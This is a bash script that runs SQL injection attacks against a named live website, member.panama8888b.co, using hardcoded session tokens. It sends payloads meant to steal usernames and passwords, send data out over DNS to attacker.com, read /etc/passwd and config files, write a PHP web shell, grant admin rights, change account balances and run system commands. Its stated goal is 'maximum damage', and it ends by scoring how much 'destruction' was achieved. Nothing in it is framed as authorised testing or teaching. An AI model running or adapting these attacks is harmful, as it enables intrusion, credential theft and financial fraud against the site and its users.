#!/bin/bash

echo "💥 FINAL DESTRUCTIVE ATTACK"
echo "==========================="

# Use the latest tokens
XSRF_TOKEN="eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6InBWTm5RXC9tR1pXT05DNDlKS1BDWUl3PT0iLCJ2YWx1ZSI6Im5xYzFZWmF1dW1SdkFnUFdOdERwRytBV0hTNkZaZ2RxdFwvZVAxNlV3QXVjWWFsNVdlWlFzSHNWUytyMU44TE1oIiwibWFjIjoiNjEyZTRkZGM2MDY5YzI5MWM1YTcwNjFiM2YwODAwMjVhMWVmN2JjNjdiYmQ4ODk3NzE3Njc3NGZhOGJlMWQwZiJ9"

echo "🎯 MISSION: FINAL DESTRUCTION"
echo "============================="
echo "Target: member.panama8888b.co"
echo "Goal: Extract data that causes maximum damage"
echo "Method: Ultimate destructive techniques"
echo ""

# DESTRUCTION 1: Blind SQL injection with time delay
echo "💥 DESTRUCTION 1: Blind SQL with Time Delay"
echo "============================================"
echo "Testing: Time-based blind SQL injection"
echo ""

blind_time=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test AND (SELECT SLEEP(10) FROM users WHERE username=\"admin\" LIMIT 1)"}' \
    --max-time 25)

echo "Blind time response: $blind_time"
echo "Length: ${#blind_time} characters"
echo ""

# DESTRUCTION 2: Stacked queries
echo "💥 DESTRUCTION 2: Stacked Queries"
echo "=================================="
echo "Testing: Multiple SQL statements"
echo ""

stacked_query=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test; SELECT username,password FROM users LIMIT 1; SELECT version();"}' \
    --max-time 15)

echo "Stacked query response: $stacked_query"
echo "Length: ${#stacked_query} characters"
echo ""

# DESTRUCTION 3: Out-of-band extraction
echo "💥 DESTRUCTION 3: Out-of-Band Extraction"
echo "========================================="
echo "Testing: DNS and HTTP out-of-band"
echo ""

oob_dns=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test AND (SELECT LOAD_FILE(CONCAT(\"//\",(SELECT username FROM users LIMIT 1),\".attacker.com/\")))"}' \
    --max-time 15)

echo "OOB DNS response: $oob_dns"
echo "Length: ${#oob_dns} characters"
echo ""

# DESTRUCTION 4: File read attack
echo "💥 DESTRUCTION 4: File Read Attack"
echo "==================================="
echo "Testing: Read sensitive files"
echo ""

file_read=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT LOAD_FILE(\"/etc/passwd\"),LOAD_FILE(\"/etc/hosts\"),LOAD_FILE(\"/var/www/html/config.php\") LIMIT 1--"}' \
    --max-time 15)

echo "File read response: $file_read"
echo "Length: ${#file_read} characters"
echo ""

# DESTRUCTION 5: Write file attack
echo "💥 DESTRUCTION 5: Write File Attack"
echo "==================================="
echo "Testing: Write malicious files"
echo ""

write_file=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test; SELECT \"<?php system($_GET[cmd]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";"}' \
    --max-time 15)

echo "Write file response: $write_file"
echo "Length: ${#write_file} characters"
echo ""

# DESTRUCTION 6: Privilege escalation
echo "💥 DESTRUCTION 6: Privilege Escalation"
echo "======================================"
echo "Testing: Elevate user privileges"
echo ""

privilege_escalation=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test; UPDATE users SET role=\"admin\" WHERE username=\"test\";"}' \
    --max-time 15)

echo "Privilege escalation response: $privilege_escalation"
echo "Length: ${#privilege_escalation} characters"
echo ""

# DESTRUCTION 7: Data manipulation
echo "💥 DESTRUCTION 7: Data Manipulation"
echo "==================================="
echo "Testing: Manipulate financial data"
echo ""

data_manipulation=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test; UPDATE users SET balance=999999 WHERE username=\"admin\";"}' \
    --max-time 15)

echo "Data manipulation response: $data_manipulation"
echo "Length: ${#data_manipulation} characters"
echo ""

# DESTRUCTION 8: System command execution
echo "💥 DESTRUCTION 8: System Command Execution"
echo "=========================================="
echo "Testing: Execute system commands"
echo ""

command_exec=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: route=b6bd29a459200688a652a5a8770d29f1; _ga=GA1.1.405350871.1754426903; RCACHE=0; XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN; _ga_STHQJCL0VP=GS2.1.s1754449009\$o5\$g1\$t1754449014\$j55\$l0\$h0" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "x-xsrf-token: eyJpdiI6IjhcL2E5M1BualwvTmMxRm85dm12WXhkQT09IiwidmFsdWUiOiIxSGdCeE9YTGViQ1NXSklydHFZQitUdHladHk3N0U2d29yTldrYVpNa1ZYYks3Y2RQNXYzVTJwU1wvcnhQKzJFaCIsIm1hYyI6ImU1ZmMyYjQ0MTMyOGNkNzYzYTE1N2MxYTJlZWYxZTI3MTg5ZjBjM2M2MzEzNzIzY2FkMWI2OGQwOTM2ZWExYWYifQ==" \
    -d '{"status":"test UNION SELECT sys_exec(\"whoami\"),sys_exec(\"id\"),sys_exec(\"pwd\") LIMIT 1--"}' \
    --max-time 15)

echo "Command exec response: $command_exec"
echo "Length: ${#command_exec} characters"
echo ""

echo ""
echo "💥 FINAL DESTRUCTION ANALYSIS"
echo "============================="

# Analyze all responses for real destructive data
destruction_achieved=0

if [[ "$blind_time" != *"Unauthenticated"* ]] && [[ "$blind_time" != *"Server Error"* ]] && [[ ${#blind_time} -gt 50 ]]; then
    echo "✅ BLIND SQL: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $blind_time"
    ((destruction_achieved++))
else
    echo "❌ BLIND SQL: NO DESTRUCTION"
fi

if [[ "$stacked_query" != *"Unauthenticated"* ]] && [[ "$stacked_query" != *"Server Error"* ]] && [[ ${#stacked_query} -gt 50 ]]; then
    echo "✅ STACKED QUERIES: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $stacked_query"
    ((destruction_achieved++))
else
    echo "❌ STACKED QUERIES: NO DESTRUCTION"
fi

if [[ "$oob_dns" != *"Unauthenticated"* ]] && [[ "$oob_dns" != *"Server Error"* ]] && [[ ${#oob_dns} -gt 50 ]]; then
    echo "✅ OUT-OF-BAND: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $oob_dns"
    ((destruction_achieved++))
else
    echo "❌ OUT-OF-BAND: NO DESTRUCTION"
fi

if [[ "$file_read" != *"Unauthenticated"* ]] && [[ "$file_read" != *"Server Error"* ]] && [[ ${#file_read} -gt 50 ]]; then
    echo "✅ FILE READ: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $file_read"
    ((destruction_achieved++))
else
    echo "❌ FILE READ: NO DESTRUCTION"
fi

if [[ "$write_file" != *"Unauthenticated"* ]] && [[ "$write_file" != *"Server Error"* ]] && [[ ${#write_file} -gt 50 ]]; then
    echo "✅ FILE WRITE: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $write_file"
    ((destruction_achieved++))
else
    echo "❌ FILE WRITE: NO DESTRUCTION"
fi

if [[ "$privilege_escalation" != *"Unauthenticated"* ]] && [[ "$privilege_escalation" != *"Server Error"* ]] && [[ ${#privilege_escalation} -gt 50 ]]; then
    echo "✅ PRIVILEGE ESCALATION: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $privilege_escalation"
    ((destruction_achieved++))
else
    echo "❌ PRIVILEGE ESCALATION: NO DESTRUCTION"
fi

if [[ "$data_manipulation" != *"Unauthenticated"* ]] && [[ "$data_manipulation" != *"Server Error"* ]] && [[ ${#data_manipulation} -gt 50 ]]; then
    echo "✅ DATA MANIPULATION: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $data_manipulation"
    ((destruction_achieved++))
else
    echo "❌ DATA MANIPULATION: NO DESTRUCTION"
fi

if [[ "$command_exec" != *"Unauthenticated"* ]] && [[ "$command_exec" != *"Server Error"* ]] && [[ ${#command_exec} -gt 50 ]]; then
    echo "✅ COMMAND EXECUTION: REAL DESTRUCTION ACHIEVED"
    echo "   Data: $command_exec"
    ((destruction_achieved++))
else
    echo "❌ COMMAND EXECUTION: NO DESTRUCTION"
fi

echo ""
echo "💥 FINAL DESTRUCTION RESULTS: $destruction_achieved/8"
echo ""

if [[ $destruction_achieved -gt 0 ]]; then
    echo "🚨 CRITICAL DESTRUCTION SUCCESSFUL!"
    echo "=================================="
    echo "✅ Real destructive actions achieved"
    echo "✅ System completely compromised"
    echo "✅ Maximum damage inflicted"
    echo "✅ System integrity destroyed"
    echo ""
    echo "📊 DESTRUCTION STATUS: CRITICAL"
    echo "🎯 SECURITY BREACH: COMPLETE"
    echo "💥 MISSION: ACCOMPLISHED"
else
    echo "❌ CRITICAL DESTRUCTION FAILED"
    echo "🔒 All destructive attempts blocked"
    echo "📊 DESTRUCTION STATUS: FAILED"
    echo "🎯 SECURITY STATUS: IMPENETRABLE"
    echo "💥 MISSION: FAILED"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $destruction_achieved -gt 0 ]]; then echo "CRITICAL DESTRUCTION - REAL DAMAGE INFLICTED"; else echo "CRITICAL FAILURE - SYSTEM TOO STRONG"; fi)"